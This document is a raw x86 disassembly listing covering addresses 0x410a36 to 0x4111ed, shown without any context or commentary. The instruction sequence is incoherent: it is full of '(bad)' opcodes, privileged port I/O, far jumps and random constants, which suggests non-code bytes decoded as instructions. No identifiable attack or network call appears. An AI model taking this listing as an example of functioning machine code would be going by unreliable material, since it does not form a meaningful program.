  410a36:	and    BYTE PTR [ecx-0x29e2dcda],0xd9
  410a3d:	adc    edx,ecx
  410a3f:	fild   WORD PTR [edi-0x2fc3fb84]
  410a45:	adc    DWORD PTR [edx-0x44be4dd3],esi
  410a4b:	imul   esp,DWORD PTR [ecx],0x2b
  410a4e:	lods   al,BYTE PTR ds:[esi]
  410a4f:	loope  0x410a8c
  410a51:	sub    DWORD PTR [esi+0x6c3e1efc],0xffffffcb
  410a58:	xor    eax,ecx
  410a5a:	fidiv  DWORD PTR ds:[ebp-0x61]
  410a5e:	(bad)  
  410a5f:	jno    0x410a77
  410a61:	and    DWORD PTR [edi+0x14],edi
  410a64:	adc    bl,BYTE PTR [edx-0x4e0999b5]
  410a6a:	stos   BYTE PTR es:[edi],al
  410a6b:	mov    cs,WORD PTR [eax-0x37]
  410a6e:	pop    ds
  410a6f:	dec    eax
  410a70:	into   
  410a71:	and    al,0x12
  410a73:	mov    al,ds:0x23e74521
  410a78:	test   DWORD PTR [edx+0x57],eax
  410a7b:	mov    bh,0x8
  410a7d:	sbb    BYTE PTR [ebx+0x4e78d5b7],dl
  410a83:	mov    eax,0x51f9a3fd
  410a88:	in     al,0xa5
  410a8a:	jnp    0x410a88
  410a8c:	add    ebx,esp
  410a8e:	or     eax,0xad79a342
  410a93:	mov    ds:0xd16b6e23,al
  410a98:	out    dx,al
  410a99:	ss jecxz 0x410a89
  410a9c:	fwait
  410a9d:	fwait
  410a9e:	cld    
  410a9f:	data16 fisttp QWORD PTR [edi-0x48]
  410aa3:	sbb    BYTE PTR [bx+si],0x2c
  410aa7:	jb     0x410a6b
  410aa9:	enter  0xe7cd,0x11
  410aad:	and    ebp,ecx
  410aaf:	dec    edi
  410ab0:	pop    ds
  410ab1:	aad    0xa4
  410ab3:	loop   0x410b20
  410ab5:	pop    edx
  410ab6:	(bad)  
  410ab7:	cld    
  410ab8:	mov    BYTE PTR [edx+0x1c0c486e],0x82
  410abf:	hlt    
  410ac0:	or     DWORD PTR [edi+edi*2],ebx
  410ac3:	jno    0x410a95
  410ac5:	adc    al,0x6d
  410ac7:	push   eax
  410ac8:	push   0xffffff87
  410aca:	clc    
  410acb:	outs   dx,DWORD PTR ds:[esi]
  410acc:	jbe    0x410b27
  410ace:	mov    ebx,0x3a897eac
  410ad3:	xchg   ebp,eax
  410ad4:	outs   dx,BYTE PTR ds:[esi]
  410ad5:	test   eax,0x307a2878
  410ada:	adc    cl,cl
  410adc:	mov    dh,BYTE PTR [edx]
  410ade:	retf   
  410adf:	push   edx
  410ae0:	rcr    ecx,cl
  410ae2:	jne    0x410b2b
  410ae4:	fwait
  410ae5:	mov    BYTE PTR [eax+0x41e4c32f],bh
  410aeb:	loope  0x410aca
  410aed:	cmp    edx,edx
  410aef:	into   
  410af0:	dec    ecx
  410af1:	adc    al,cl
  410af3:	adc    BYTE PTR [ecx+0x72],cl
  410af6:	scas   al,BYTE PTR es:[edi]
  410af7:	aas    
  410af8:	cmp    dl,BYTE PTR [edi-0x644fbf65]
  410afe:	shl    BYTE PTR [edx],0x54
  410b01:	push   ebp
  410b02:	xchg   BYTE PTR [ecx+0x1d],dl
  410b05:	int3   
  410b06:	int3   
  410b07:	ds sub esi,ebx
  410b0a:	rol    DWORD PTR [ebx-0x3],0x6d
  410b0e:	ret    
  410b0f:	xor    BYTE PTR [edx+0x55],cl
  410b12:	inc    ebx
  410b13:	out    dx,al
  410b14:	xbegin 0x1516ddf7
  410b1a:	cmc    
  410b1b:	outs   dx,DWORD PTR ds:[esi]
  410b1c:	out    0x95,al
  410b1e:	fnsave [ecx-0x59]
  410b21:	xchg   edx,eax
  410b22:	cmp    eax,0xf63a86aa
  410b27:	les    edx,FWORD PTR [esi+0x1c5d115a]
  410b2d:	mov    edx,0x475899cb
  410b32:	fsub   st,st(6)
  410b34:	ret    0x19f9
  410b37:	rcl    BYTE PTR [ecx+0x5c],1
  410b3a:	adc    ch,ch
  410b3c:	push   0x1fe91c6b
  410b41:	std    
  410b42:	jl     0x410bad
  410b44:	ja     0x410b25
  410b46:	fnstsw WORD PTR [esi+0x4dbbdb07]
  410b4c:	mov    al,BYTE PTR [ebp-0x44]
  410b4f:	push   eax
  410b50:	and    al,0x32
  410b52:	mov    bh,0xba
  410b54:	jmp    0x410b36
  410b56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b57:	call   0x604e:0x29537bde
  410b5e:	xor    BYTE PTR [ebx+0x2711316b],0x9d
  410b65:	or     edi,ebx
  410b67:	pop    ss
  410b68:	inc    ebx
  410b69:	fsubr  DWORD PTR ds:0x624d0db5
  410b6f:	cmc    
  410b70:	fnstcw WORD PTR [eax+0x14562df3]
  410b76:	shr    BYTE PTR ds:0xe484317b,0xc
  410b7d:	xchg   esi,eax
  410b7e:	xchg   esp,eax
  410b7f:	mov    ebx,0x6b6c2f1f
  410b84:	lods   eax,DWORD PTR ds:[esi]
  410b85:	repnz mov edx,0xf48228a7
  410b8b:	jge    0x410c0a
  410b8d:	je     0x410b6f
  410b8f:	sub    bh,BYTE PTR [eax+0x67]
  410b92:	dec    DWORD PTR [edx]
  410b94:	jne    0x410b7c
  410b96:	pop    ebp
  410b97:	dec    esi
  410b98:	mov    WORD PTR [eax-0x3],?
  410b9b:	sub    eax,0xd7524bd8
  410ba0:	inc    edi
  410ba1:	and    al,0xeb
  410ba3:	push   edx
  410ba4:	mov    esi,0x9d12d03b
  410ba9:	lods   eax,DWORD PTR ds:[esi]
  410baa:	mov    ebx,0x1947a4d8
  410baf:	(bad)  
  410bb0:	arpl   WORD PTR [ebx+eiz*2-0x75a4c3f9],di
  410bb7:	xor    edi,DWORD PTR [edi]
  410bb9:	sti    
  410bba:	cwde   
  410bbb:	xor    ebp,DWORD PTR [ebp-0x6d06c8f9]
  410bc1:	mov    eax,0x5d783836
  410bc6:	mov    BYTE PTR [eax+eax*2+0x47b29f85],dh
  410bcd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410bce:	cmp    al,0x54
  410bd0:	fs push edx
  410bd2:	cmp    esi,DWORD PTR [eax+0x2e8fdd5e]
  410bd8:	loope  0x410bc7
  410bda:	mov    eax,ds:0xe17fbd6a
  410bdf:	push   cs
  410be0:	mov    eax,0xe9fedd3b
  410be5:	pop    eax
  410be6:	push   cs
  410be7:	fs ret 0xa14f
  410beb:	push   ebx
  410bec:	nop
  410bed:	mov    eax,ds:0xfa4e093f
  410bf2:	push   ds
  410bf3:	ret    0xf7c2
  410bf6:	pop    esi
  410bf7:	cwde   
  410bf8:	ror    dh,0x3f
  410bfb:	lahf   
  410bfc:	pop    ebp
  410bfd:	jg     0x410bd4
  410bff:	out    dx,eax
  410c00:	out    dx,al
  410c01:	mov    eax,ds:0xfeea2f17
  410c06:	jmp    0x410c31
  410c08:	cwde   
  410c09:	(bad)  
  410c0b:	vmwrite eax,DWORD PTR [ebp-0x48998d4b]
  410c12:	into   
  410c13:	xchg   DWORD PTR [ebx-0x6d],esi
  410c16:	loopne 0x410c3d
  410c18:	(bad)  
  410c19:	sbb    eax,0x5f5ac7f8
  410c1e:	inc    eax
  410c1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410c20:	icebp  
  410c21:	jae    0x410bec
  410c23:	xchg   esp,eax
  410c24:	cmp    al,0x4
  410c26:	gs pop ebx
  410c28:	pop    ecx
  410c29:	dec    esp
  410c2a:	jl     0x410c5a
  410c2c:	inc    esi
  410c2d:	jmp    0xef76:0x48157a39
  410c34:	fist   WORD PTR [ebx+0x7f5adacd]
  410c3a:	push   eax
  410c3b:	mov    edi,edi
  410c3d:	jne    0x410c18
  410c3f:	scas   eax,DWORD PTR es:[edi]
  410c40:	mov    ds:0x26b4eb8a,eax
  410c45:	sbb    DWORD PTR [eax+eax*1-0x67ea0698],ebx
  410c4c:	jg     0x410c48
  410c4e:	push   eax
  410c4f:	push   ebx
  410c50:	addr16 or edi,esi
  410c53:	mov    ebp,0x7e8385c9
  410c58:	xchg   edx,eax
  410c59:	pop    es
  410c5a:	xor    ch,BYTE PTR [esi+0x5130267c]
  410c60:	or     ecx,ebx
  410c62:	pop    ecx
  410c63:	mov    ah,0x44
  410c65:	frstor [ecx-0x5d]
  410c68:	ret    0x3e07
  410c6b:	sub    DWORD PTR [edx+ebx*4+0x4c042aa2],ecx
  410c72:	aam    0xaa
  410c74:	inc    eax
  410c75:	shl    bl,cl
  410c77:	sub    ebx,DWORD PTR [edx]
  410c79:	sub    edi,eax
  410c7b:	fwait
  410c7c:	mov    BYTE PTR [esi],cl
  410c7e:	clc    
  410c7f:	mov    BYTE PTR [ebp+edi*2+0x27b0181c],bh
  410c86:	dec    ebx
  410c87:	stc    
  410c88:	jmp    0x4fb9:0xa78be664
  410c8f:	sahf   
  410c90:	ins    DWORD PTR es:[edi],dx
  410c91:	jp     0x410cf7
  410c93:	jo     0x410c9f
  410c95:	out    dx,eax
  410c96:	inc    edi
  410c97:	call   0x5a7c3fa8
  410c9c:	jl     0x410c73
  410c9e:	out    0xf4,al
  410ca0:	or     esp,DWORD PTR [esi+0x1cc563e5]
  410ca6:	icebp  
  410ca7:	cmp    DWORD PTR [eax-0x4a],0xfffffff5
  410cab:	int3   
  410cac:	jl     0x410c9b
  410cae:	pop    esp
  410caf:	mov    eax,ds:0xcb49c8ff
  410cb4:	dec    eax
  410cb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410cb6:	push   ecx
  410cb7:	adc    dh,BYTE PTR [ebp-0x73]
  410cba:	imul   ecx,DWORD PTR [eax+0x42],0xed6308cd
  410cc1:	cmp    bl,dl
  410cc3:	in     al,0x4d
  410cc5:	and    DWORD PTR [eax],0xfffffff7
  410cc8:	jecxz  0x410d2f
  410cca:	mov    ch,0xe1
  410ccc:	xor    bl,BYTE PTR [ebx+0x7e205b99]
  410cd2:	sub    eax,0x1231440
  410cd7:	scas   eax,DWORD PTR es:[edi]
  410cd8:	xchg   esp,eax
  410cd9:	or     edx,DWORD PTR [esi]
  410cdb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410cdc:	mov    al,0xb0
  410cde:	xchg   ebx,eax
  410cdf:	push   0xfffffffa
  410ce1:	popa   
  410ce2:	arpl   WORD PTR [eax+ecx*2],di
  410ce5:	mov    ch,0x13
  410ce7:	push   edi
  410ce8:	(bad)  
  410cea:	mov    dl,0x75
  410cec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410ced:	fidivr DWORD PTR [ecx+edx*2+0x1b]
  410cf1:	(bad)  
  410cf2:	(bad)  
  410cf3:	sahf   
  410cf4:	call   0x75ba:0x6a9e28d4
  410cfb:	pusha  
  410cfc:	addr16 mov ds:0x4cfe,eax
  410d00:	mov    edx,0xb9347de0
  410d05:	mov    ebx,DWORD PTR [eax-0x7b058947]
  410d0b:	repnz sub al,0x52
  410d0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410d0f:	cwde   
  410d10:	pusha  
  410d11:	popa   
  410d12:	cmp    dh,ch
  410d14:	icebp  
  410d15:	les    ecx,FWORD PTR [esi]
  410d17:	pop    ss
  410d18:	rcr    BYTE PTR [edi-0x3e236971],1
  410d1e:	jo     0x410d42
  410d20:	fisub  DWORD PTR [edi]
  410d22:	repnz enter 0x9da9,0xd8
  410d27:	adc    al,0x63
  410d29:	sub    DWORD PTR [edi],esp
  410d2b:	mov    dh,0x6f
  410d2d:	ret    
  410d2e:	(bad)  
  410d2f:	jecxz  0x410d88
  410d31:	jmp    0x91b8:0x98164629
  410d38:	rcl    bh,1
  410d3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410d3b:	out    dx,eax
  410d3c:	outs   dx,BYTE PTR ds:[esi]
  410d3d:	xchg   esp,eax
  410d3e:	fild   WORD PTR [ebx+0x59]
  410d41:	dec    edi
  410d42:	loope  0x410d54
  410d44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410d45:	dec    edx
  410d46:	xchg   BYTE PTR [ebp+0x3cdceba9],ah
  410d4c:	adc    eax,0x2a276da7
  410d51:	push   es
  410d52:	cwde   
  410d53:	push   ebx
  410d54:	and    bh,0xd9
  410d57:	out    dx,al
  410d58:	fimul  WORD PTR [edi]
  410d5a:	push   fs
  410d5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410d5d:	into   
  410d5e:	pushf  
  410d5f:	jae    0x410d28
  410d61:	and    al,0x46
  410d63:	ds es popf 
  410d66:	xor    esi,DWORD PTR [ebx-0x16c06325]
  410d6c:	cld    
  410d6d:	or     eax,0xd0b5b03b
  410d72:	test   al,0xca
  410d74:	jecxz  0x410d68
  410d76:	xlat   BYTE PTR ds:[ebx]
  410d77:	pop    ds
  410d78:	and    edx,DWORD PTR [ebx]
  410d7a:	dec    esi
  410d7b:	jns    0x410d1d
  410d7d:	mov    ebx,0xc6ee8654
  410d82:	ret    
  410d83:	mov    esi,0xb9c381c7
  410d88:	jle    0x410dd3
  410d8a:	rcr    BYTE PTR [esi-0x46],0x8c
  410d8e:	call   0x414c:0xc6a4b9b4
  410d95:	mov    esp,0xedae20d1
  410d9a:	push   ss
  410d9b:	push   cs
  410d9c:	or     BYTE PTR [eax+0x5a],0x7f
  410da0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410da1:	cmp    BYTE PTR [esi+0x76fc32ff],bl
  410da7:	push   es
  410da8:	test   DWORD PTR es:[ecx],ecx
  410dab:	out    0xa5,al
  410dad:	ins    BYTE PTR es:[edi],dx
  410dae:	shr    DWORD PTR [ebx+0x11],1
  410db1:	cmp    bh,BYTE PTR [esi+esi*2]
  410db4:	jb     0x410d50
  410db6:	sbb    BYTE PTR [ecx],dl
  410db8:	jle    0x410d95
  410dba:	retf   0xa984
  410dbd:	mov    ds:0xd300909d,eax
  410dc2:	mul    DWORD PTR [esi-0x39d5254e]
  410dc8:	fcomp  DWORD PTR gs:[edi]
  410dcb:	xor    bh,BYTE PTR [eax-0xc]
  410dce:	pop    edi
  410dcf:	dec    BYTE PTR [eax]
  410dd1:	scas   al,BYTE PTR es:[edi]
  410dd2:	sub    al,BYTE PTR [ecx+0x6e]
  410dd5:	sub    al,0xf1
  410dd7:	in     eax,dx
  410dd8:	pop    es
  410dd9:	pop    ss
  410dda:	jge    0x410d87
  410ddc:	and    al,0xc4
  410dde:	jns    0x410e55
  410de0:	cmp    al,0x34
  410de2:	les    edx,FWORD PTR [edx+0x3a]
  410de5:	mov    DWORD PTR [esi],esi
  410de7:	jb     0x410e3d
  410de9:	sub    al,BYTE PTR [eax]
  410deb:	mov    ds:0x97865b3d,al
  410df0:	out    dx,eax
  410df1:	scas   eax,DWORD PTR es:[edi]
  410df2:	int3   
  410df3:	fsubrp st(6),st
  410df5:	push   ebx
  410df6:	sub    DWORD PTR [esp+esi*2+0xd],eax
  410dfa:	jle    0x410d99
  410dfc:	mov    esi,DWORD PTR [eax-0x77]
  410dff:	and    ebp,DWORD PTR [eax+0x1e110d64]
  410e05:	lahf   
  410e06:	adc    DWORD PTR [edi+0x45be76b7],edx
  410e0c:	leave  
  410e0d:	or     al,0x1e
  410e0f:	inc    esi
  410e10:	dec    ebx
  410e11:	out    0x92,eax
  410e13:	lahf   
  410e14:	in     eax,0xb3
  410e16:	add    esi,DWORD PTR [ecx]
  410e18:	or     DWORD PTR [esi],ebx
  410e1a:	mov    esi,0x870d99dc
  410e1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410e20:	mov    edx,0x85daf680
  410e25:	(bad)  
  410e26:	mov    dh,0xf7
  410e28:	call   DWORD PTR ds:0xcdf08f3b
  410e2e:	sbb    esp,0x18
  410e31:	pop    ebx
  410e32:	xchg   DWORD PTR [eax-0x39],edx
  410e35:	add    cl,BYTE PTR [ebp-0x454b1e49]
  410e3b:	push   0xffffffe9
  410e3d:	imul   ebx,DWORD PTR [ecx],0x2a
  410e40:	or     eax,0x216257ad
  410e45:	or     dh,BYTE PTR [edi+0x5c]
  410e48:	ins    DWORD PTR es:[edi],dx
  410e49:	pushf  
  410e4a:	scas   eax,DWORD PTR es:[edi]
  410e4b:	xlat   BYTE PTR ds:[ebx]
  410e4c:	fnstcw WORD PTR [edi+edx*8]
  410e4f:	call   0x364d667d
  410e54:	iret   
  410e55:	fistp  DWORD PTR [ecx-0x891779a]
  410e5b:	inc    ebp
  410e5c:	fst    DWORD PTR [edx-0x2f5e67a3]
  410e62:	or     dl,BYTE PTR [ebx+ebx*1+0xae41939]
  410e69:	out    dx,al
  410e6a:	shl    BYTE PTR ds:0x638892e5,cl
  410e70:	retf   
  410e71:	ins    BYTE PTR es:[edi],dx
  410e72:	xchg   ebp,eax
  410e73:	arpl   WORD PTR [edx],ax
  410e75:	pop    ebx
  410e76:	mov    ebp,0xf5cb6c3c
  410e7b:	xchg   edx,eax
  410e7c:	int3   
  410e7d:	and    ch,BYTE PTR [ebx]
  410e7f:	add    DWORD PTR [edi],edi
  410e81:	mov    dh,0x28
  410e83:	push   ebx
  410e84:	sbb    BYTE PTR [ebp-0x5cafd2d8],bh
  410e8a:	inc    esi
  410e8b:	mov    esi,0x4f659d50
  410e90:	shr    DWORD PTR [eax-0x7d7c7a94],0xa5
  410e97:	ret    0x2d0b
  410e9a:	mov    cl,0xe3
  410e9c:	je     0x410e76
  410e9e:	and    al,0xbf
  410ea0:	push   ecx
  410ea1:	cmp    eax,0x2a5e56db
  410ea6:	sbb    DWORD PTR [edi-0x37e41df1],esp
  410eac:	push   esp
  410ead:	push   edi
  410eae:	ins    BYTE PTR es:[edi],dx
  410eaf:	dec    ebx
  410eb0:	mov    fs:0x13b1fd97,eax
  410eb6:	push   ds
  410eb7:	xchg   DWORD PTR [ebp+0x60d2398b],ebp
  410ebd:	aam    0xb0
  410ebf:	cmp    esp,esi
  410ec1:	dec    esi
  410ec2:	adc    DWORD PTR [esi],0xc97915fe
  410ec8:	pop    eax
  410ec9:	fimul  DWORD PTR [ecx]
  410ecb:	sbb    cl,dl
  410ecd:	test   al,0xaf
  410ecf:	sub    al,0xcc
  410ed1:	cli    
  410ed2:	push   es
  410ed3:	and    ebx,DWORD PTR [esi]
  410ed5:	jge    0x410ebb
  410ed7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410ed8:	xlat   BYTE PTR ds:[ebx]
  410ed9:	xchg   ebx,eax
  410eda:	mov    ds:0x2f1849ba,eax
  410edf:	fisubr DWORD PTR [ecx-0x35]
  410ee2:	xor    ebp,DWORD PTR [esi]
  410ee4:	pusha  
  410ee5:	mov    eax,ds:0x103a5dbf
  410eea:	scas   al,BYTE PTR es:[edi]
  410eeb:	add    eax,0xefeb99e8
  410ef0:	fnstsw WORD PTR [eax-0x565bba6]
  410ef6:	fisub  WORD PTR [edi]
  410ef8:	mov    edx,0x416038f6
  410efd:	aam    0xa0
  410eff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f00:	add    BYTE PTR [edi+0x7155a6c8],bh
  410f06:	jmp    0x410f81
  410f08:	pop    ebx
  410f09:	sbb    BYTE PTR [ecx-0x76],cl
  410f0c:	mov    dh,0x2c
  410f0e:	xor    BYTE PTR [edi],cl
  410f10:	retf   
  410f11:	stc    
  410f12:	pusha  
  410f13:	push   ds
  410f14:	fnstcw WORD PTR [edx]
  410f16:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  410f18:	and    ecx,0xe858fdb6
  410f1e:	sub    al,0xb9
  410f20:	mov    ch,BYTE PTR [ebx-0x13]
  410f23:	sub    ch,BYTE PTR [ecx+0x9daf74c]
  410f29:	cmp    eax,DWORD PTR [esi]
  410f2b:	inc    eax
  410f2c:	scas   al,BYTE PTR es:[edi]
  410f2d:	push   ds
  410f2e:	gs xor al,0x98
  410f31:	pop    eax
  410f32:	mov    ebp,0xdc5e3892
  410f37:	dec    ebp
  410f38:	call   0x8598ac6f
  410f3d:	in     al,dx
  410f3e:	xchg   ecx,ecx
  410f40:	and    BYTE PTR [edi-0x3e71a12],al
  410f46:	fldpi  
  410f48:	and    BYTE PTR [edi],ah
  410f4a:	ret    0x88ac
  410f4d:	dec    edx
  410f4e:	pop    ebp
  410f4f:	push   esi
  410f50:	sub    eax,0x68433627
  410f55:	ror    BYTE PTR [ebp+0x1b],cl
  410f58:	addr16 mov bl,0x46
  410f5b:	dec    edi
  410f5c:	mov    esp,0xbf155b73
  410f61:	mov    ecx,0x16a75ed4
  410f66:	xchg   edx,eax
  410f67:	adc    ebx,DWORD PTR [eax+edi*1+0x372fc0a9]
  410f6e:	or     esi,DWORD PTR [ecx-0x46d6f449]
  410f74:	sub    BYTE PTR fs:[edi],al
  410f77:	cld    
  410f78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410f79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410f7a:	test   eax,0x5dac3049
  410f7f:	arpl   ax,di
  410f81:	neg    DWORD PTR [esi-0x73c9a7d3]
  410f87:	add    eax,0x2ce45bc0
  410f8c:	pop    ebp
  410f8d:	push   ds
  410f8e:	stc    
  410f8f:	jbe    0x410fa0
  410f91:	(bad)  
  410f92:	out    dx,al
  410f93:	inc    eax
  410f94:	cmc    
  410f95:	adc    dl,0x48
  410f98:	in     eax,0xb3
  410f9a:	pop    edi
  410f9b:	cmp    al,0x82
  410f9d:	into   
  410f9e:	adc    BYTE PTR [ebp+0x28],al
  410fa1:	loopne 0x410f6f
  410fa3:	sbb    BYTE PTR [esp+edx*1],cl
  410fa6:	add    al,0xb7
  410fa8:	jbe    0x410f60
  410faa:	inc    edi
  410fab:	ss in  eax,dx
  410fad:	js     0x410fee
  410faf:	cmc    
  410fb0:	dec    edi
  410fb1:	jb     0x410f8c
  410fb3:	arpl   WORD PTR [esp+esi*2],sp
  410fb6:	push   es
  410fb7:	xadd   BYTE PTR [ebx-0x71],bh
  410fbb:	or     al,al
  410fbd:	aas    
  410fbe:	aam    0x7c
  410fc0:	cld    
  410fc1:	push   es
  410fc2:	(bad)
  410fc6:	lods   al,BYTE PTR ds:[esi]
  410fc7:	repnz test al,0xa3
  410fca:	stos   BYTE PTR es:[edi],al
  410fcb:	pop    es
  410fcc:	mov    ebp,0x50d89483
  410fd1:	jg     0x411009
  410fd3:	or     edx,DWORD PTR [ecx]
  410fd5:	pusha  
  410fd6:	pop    ss
  410fd7:	fstp   QWORD PTR [edi+0x1661c442]
  410fdd:	mov    ebx,0x958e7adc
  410fe2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410fe3:	mov    ds:0xe53c843b,eax
  410fe8:	push   eax
  410fe9:	or     eax,0xb0b232ca
  410fee:	mov    ah,0x68
  410ff0:	mov    edx,DWORD PTR [ebx+0x4e]
  410ff3:	cmp    al,0xe5
  410ff5:	repz inc esi
  410ff7:	retf   
  410ff8:	lea    esi,ds:0x8184464f
  410ffe:	add    ecx,DWORD PTR [ebp-0x1c]
  411001:	icebp  
  411002:	imul   esp,eax,0x877498e1
  411008:	jno    0x410f99
  41100a:	stc    
  41100b:	or     eax,0xfb4b7b59
  411010:	in     al,dx
  411011:	call   0xe90e:0xcbdc478e
  411018:	push   ss
  411019:	int    0xf3
  41101b:	sbb    al,0x94
  41101d:	pusha  
  41101e:	sub    ch,BYTE PTR [edi]
  411020:	inc    ebp
  411021:	xor    eax,0x995aadb8
  411026:	jb     0x41105a
  411028:	or     BYTE PTR [ecx],dl
  41102a:	hlt    
  41102b:	xchg   ecx,eax
  41102c:	adc    al,BYTE PTR [eax-0x6e1739dd]
  411032:	jle    0x410fdf
  411034:	jae    0x410fda
  411036:	lea    ecx,[eax-0x55d0a273]
  41103c:	jne    0x410fde
  41103e:	loop   0x410feb
  411040:	xor    al,0xde
  411042:	loope  0x411061
  411044:	pop    ds
  411045:	jnp    0x411074
  411047:	ret    0x38ec
  41104a:	int3   
  41104b:	in     eax,dx
  41104c:	push   ebp
  41104d:	and    DWORD PTR cs:[ebp+ebp*1+0x10],edi
  411052:	inc    ebx
  411053:	test   ebp,ecx
  411055:	test   esi,0x4c8cc43
  41105b:	push   0xffffffc4
  41105d:	sub    DWORD PTR [ebp-0x1fd9f605],edx
  411063:	and    al,0xf4
  411065:	out    dx,eax
  411066:	iret   
  411067:	imul   esi,edx,0x6d7f12f8
  41106d:	pop    ebx
  41106e:	mov    ds:0x640d42b0,eax
  411073:	adc    DWORD PTR [ebp-0x18e950cc],ebp
  411079:	mov    cl,0xb
  41107b:	mov    BYTE PTR [eax],bh
  41107d:	scas   eax,DWORD PTR es:[edi]
  41107e:	inc    BYTE PTR [edi-0x5a]
  411081:	add    al,0xc3
  411083:	pop    ebx
  411084:	jb     0x411029
  411086:	mov    bh,0x5
  411088:	xor    eax,0x639067fc
  41108d:	dec    BYTE PTR ds:0x4e5a8233
  411093:	sbb    al,0xb0
  411095:	mov    ds:0x24194671,al
  41109a:	int3   
  41109b:	lds    eax,FWORD PTR [eax-0x65]
  41109e:	in     al,dx
  41109f:	sub    BYTE PTR [edi],dl
  4110a1:	mov    ah,0x78
  4110a3:	xor    esi,eax
  4110a5:	out    0x52,eax
  4110a7:	push   ecx
  4110a8:	or     al,0x39
  4110aa:	fimul  WORD PTR [esi-0x4c02a1db]
  4110b0:	pop    eax
  4110b1:	stc    
  4110b2:	add    al,0x11
  4110b4:	sbb    eax,0xa746d3c8
  4110b9:	retf   
  4110ba:	les    eax,FWORD PTR [esi+0x3eb892ef]
  4110c0:	mov    ds:0x214652e9,al
  4110c5:	sbb    eax,0x8974beb7
  4110ca:	cwde   
  4110cb:	add    ah,ch
  4110cd:	lahf   
  4110ce:	cmp    BYTE PTR [esi-0x6c9e078e],cl
  4110d4:	fs test eax,0x2e385d6e
  4110da:	or     edi,esi
  4110dc:	popf   
  4110dd:	cmp    BYTE PTR [esi],0xc0
  4110e0:	pop    esp
  4110e1:	sahf   
  4110e2:	push   0x69eba12d
  4110e7:	rol    bl,cl
  4110e9:	sub    edi,DWORD PTR [edi+0x2628462c]
  4110ef:	and    edi,esp
  4110f1:	sub    esi,DWORD PTR [edi+0x4bc836bc]
  4110f7:	pop    ds
  4110f8:	nop
  4110f9:	test   BYTE PTR [eax],al
  4110fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4110fc:	je     0x41116b
  4110fe:	mov    dl,0xbb
  411100:	and    BYTE PTR [edx-0x4a2e9be1],ah
  411106:	fisttp QWORD PTR [ebx-0x1b]
  411109:	fisub  DWORD PTR [edi]
  41110b:	icebp  
  41110c:	push   ss
  41110d:	loop   0x4110ff
  41110f:	aas    
  411110:	push   ebx
  411111:	jmp    0x41117d
  411113:	inc    ebp
  411114:	adc    eax,0xfd825347
  411119:	add    dh,bl
  41111b:	neg    DWORD PTR [edi-0x181212d5]
  411121:	add    eax,0xbb94702f
  411126:	or     DWORD PTR [esi-0x470d07c2],0xffffff86
  41112d:	add    ah,bl
  41112f:	sbb    bl,al
  411131:	mov    eax,0xa0e33c
  411136:	and    ebx,DWORD PTR [ebp+0x33]
  411139:	mov    ecx,0x9ce94e1e
  41113e:	cwde   
  41113f:	out    0x9e,al
  411141:	loopne 0x4110fe
  411143:	push   esi
  411144:	or     BYTE PTR [edi+ebp*8],dh
  411147:	rcl    DWORD PTR [esi],cl
  411149:	addr16 stos DWORD PTR es:[di],eax
  41114c:	xor    DWORD PTR [eax],0xa4874f05
  411152:	and    BYTE PTR [edx+0x10],0x85
  411156:	ud0    esp,esi
  411159:	data16 cmp cl,BYTE PTR [edi+0x59]
  41115d:	jp     0x41110f
  41115f:	jae    0x411190
  411161:	sub    BYTE PTR [ecx-0xfe4f546],ah
  411167:	ret    
  411168:	gs je  0x4111b0
  41116b:	jbe    0x411148
  41116d:	dec    esp
  41116e:	fidiv  WORD PTR [edx+0x6daab661]
  411174:	cmp    al,0x9
  411176:	pusha  
  411177:	jge    0x41111e
  411179:	in     eax,0xa1
  41117b:	inc    esp
  41117c:	cmp    BYTE PTR [esi-0x25],dl
  41117f:	add    BYTE PTR [eax],ch
  411181:	mov    eax,ds:0x51da65b1
  411186:	jle    0x411118
  411188:	ins    DWORD PTR es:[edi],dx
  411189:	in     al,0x93
  41118b:	inc    ebx
  41118c:	stc    
  41118d:	stos   DWORD PTR es:[edi],eax
  41118e:	mov    eax,ds:0x9420beca
  411193:	sub    BYTE PTR [edx-0x6b],ah
  411196:	in     eax,dx
  411197:	mov    ebp,0x9452b291
  41119c:	jne    0x4111f3
  41119e:	in     eax,dx
  41119f:	jle    0x4111f5
  4111a1:	dec    esi
  4111a2:	push   0x411a2a8e
  4111a7:	add    DWORD PTR [esp+edi*8],eax
  4111aa:	sahf   
  4111ab:	inc    esi
  4111ac:	xchg   ebx,eax
  4111ad:	xchg   esp,eax
  4111ae:	repnz fdivp st(6),st
  4111b1:	sub    BYTE PTR [edx],bl
  4111b3:	push   ds
  4111b4:	pop    eax
  4111b5:	out    dx,eax
  4111b6:	data16 mov ds:0x120b8fdd,al
  4111bc:	rol    DWORD PTR [eax-0x136ab867],cl
  4111c2:	inc    esi
  4111c3:	mov    al,0x84
  4111c5:	push   ebp
  4111c6:	arpl   WORD PTR [ebx+eax*4],di
  4111c9:	addr16 jb 0x411199
  4111cc:	in     eax,dx
  4111cd:	sar    DWORD PTR [ecx+0x1f383302],cl
  4111d3:	call   0x7c91a7fd
  4111d8:	sbb    al,0x58
  4111da:	in     eax,dx
  4111db:	adc    BYTE PTR [edx],cl
  4111dd:	jnp    0x4111df
  4111df:	sbb    BYTE PTR ds:0x68d1b626,dh
  4111e5:	push   0xf7f271e2
  4111ea:	aas    
  4111eb:	pop    ebp
  4111ec:	inc    esi
  4111ed:	jmp    0x465048c6
